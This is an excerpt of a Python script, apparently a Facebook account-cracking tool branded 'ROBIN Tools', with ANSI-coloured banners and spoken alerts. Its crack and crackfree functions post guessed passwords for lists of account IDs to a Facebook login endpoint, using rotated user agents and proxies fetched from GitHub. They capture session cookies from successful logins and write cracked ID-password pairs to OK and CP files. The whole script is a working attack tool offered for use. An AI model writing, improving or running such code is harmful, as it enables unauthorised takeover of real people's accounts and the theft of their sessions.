...
princp=[]
try:
    prox= requests.get('https://github.com/MAHMUD-ROBIN-404/PRO-MAX/blob/main/Prox.txt').text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/dashboard').text
        ua=open('bbnew.txt','w')
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/ROBIN.CYBER.143.MYMENSINGH.ER.KING')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
os.system("xdg-open https://www.facebook.com/profile.php?id=100073731281877&mibextid=ZbWKwL")
#------------------[ LOGO-LAKNAT ]-----------------#
logo =""" 
...
\033[1;35m: :: ::    \033[38;5;46m:   : :  \033[37;1m:: :: :
\033[38;5;46m══════════════════════════════               
 \033[1;35m  𝗡𝗔𝗠𝗘 \033[38;5;46mROBIN
 \033[1;35m𝗚𝗜𝗧𝗛𝗨𝗕 \033[38;5;46m𝗠𝗔𝗫 RJ 𝗠𝗔𝗡  
 \033[1;35m𝗡𝗨𝗠𝗕𝗘𝗥 \033[38;5;46m01981785506
 \033[1;35m𝗥𝗔𝗡𝗗𝗢𝗠\033[38;5;46m 𝟬𝟭           
\033[38;5;46m══════════════════════════════    
                                       """
os.system('clear')
print(logo)
...
os.system('espeak -a 300 " Welcome,   to,  ROBIN,   Tools"')
pass
...
def menu():
    ...
    if ROBIN in ['111']:
        ...
        os.system('xdg-open https://wa.me/+8801726668302')
        os.system("python nono.py")
    elif ROBIN in ['3','03']:
        result()
    elif ROBIN in ['0']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[ROBIN•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            po = ses.post('http//x.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[ROBIN-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[ROBIN-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " Tut,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[ROBIN-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•ROBIN-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•ROBIN-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  ROBIN,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
